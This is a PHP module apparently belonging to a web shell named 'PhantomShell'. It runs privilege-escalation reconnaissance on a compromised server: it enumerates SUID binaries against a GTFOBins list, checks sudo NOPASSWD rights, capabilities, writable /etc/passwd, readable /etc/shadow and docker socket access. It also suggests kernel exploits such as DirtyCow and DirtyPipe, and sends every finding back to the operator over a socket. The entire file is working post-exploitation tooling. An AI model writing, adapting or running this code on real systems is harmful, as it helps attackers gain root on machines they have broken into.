<?php
// PhantomShell Module: Privilege Escalation
// Load via MINIMAL mode: fetch privesc

function mod_privesc_scan($sock) {
    $results = array();

    // SUID binaries
    $o = '';
    $cmd = 'find / -perm -4000 -type f 2>/dev/null';
    if(function_exists('shell_exec')) $o = (string)@shell_exec($cmd);
    elseif(function_exists('exec')) { $l=array(); @exec($cmd,$l); $o=implode("\n",$l); }

    $gtfo = array('find','python','python3','perl','bash','cp','nmap','vim','vi',
        'less','more','pkexec','env','awk','tar','zip','docker','node','php',
        'ruby','gdb','screen','socat','base64');

    foreach(array_filter(explode("\n", trim($o))) as $f) {
        $bn = strtolower(basename($f));
        foreach($gtfo as $g) {
            if($bn === $g) {
                $results[] = "[SUID] $f (GTFOBins: $g)";
                break;
            }
        }
    }

    // Sudo
    $o = '';
    if(function_exists('shell_exec')) $o = (string)@shell_exec('sudo -n -l 2>&1');
    if(strpos($o, 'NOPASSWD') !== false) {
        $results[] = "[SUDO] NOPASSWD entries found";
    }

    // Capabilities
    $o = '';
    if(function_exists('shell_exec')) $o = (string)@shell_exec('getcap -r / 2>/dev/null');
    foreach(array('cap_setuid','cap_sys_admin','cap_dac_override') as $dc) {
        if(stripos($o, $dc) !== false) $results[] = "[CAP] $dc found";
    }

    // Writable /etc/passwd
    if(is_writable('/etc/passwd')) $results[] = "[CRITICAL] /etc/passwd is writable!";
    if(is_readable('/etc/shadow')) $results[] = "[CRITICAL] /etc/shadow is readable!";

    // Docker group
    $o = '';
    if(function_exists('shell_exec')) $o = (string)@shell_exec('id -nG 2>/dev/null');
    if(strpos($o, 'docker') !== false) $results[] = "[DOCKER] User in docker group";
    if(file_exists('/var/run/docker.sock') && is_writable('/var/run/docker.sock'))
        $results[] = "[DOCKER] Socket writable!";

    return $results;
}

function mod_privesc_exploit_suggest() {
    $kv = array(0,0,0);
    if(preg_match('/^(\d+)\.(\d+)\.(\d+)/', php_uname('r'), $m))
        $kv = array((int)$m[1], (int)$m[2], (int)$m[3]);

    $exploits = array();
    if($kv[0] < 4 || ($kv[0] == 4 && $kv[1] < 8))
        $exploits[] = 'CVE-2016-5195 (DirtyCow)';
    if($kv[0] == 5 && $kv[1] >= 8)
        $exploits[] = 'CVE-2022-0847 (DirtyPipe)';
    if(($kv[0] == 5 && $kv[1] == 15) || ($kv[0] == 6 && $kv[1] <= 2))
        $exploits[] = 'CVE-2023-2640 (GameOverlay)';

    return $exploits;
}

if(isset($sock)) {
    $r = mod_privesc_scan($sock);
    foreach($r as $line) @fwrite($sock, "  $line\n");
    $e = mod_privesc_exploit_suggest();
    if($e) { @fwrite($sock, "\n  Suggested exploits:\n"); foreach($e as $ex) @fwrite($sock, "    - $ex\n"); }
}
?>
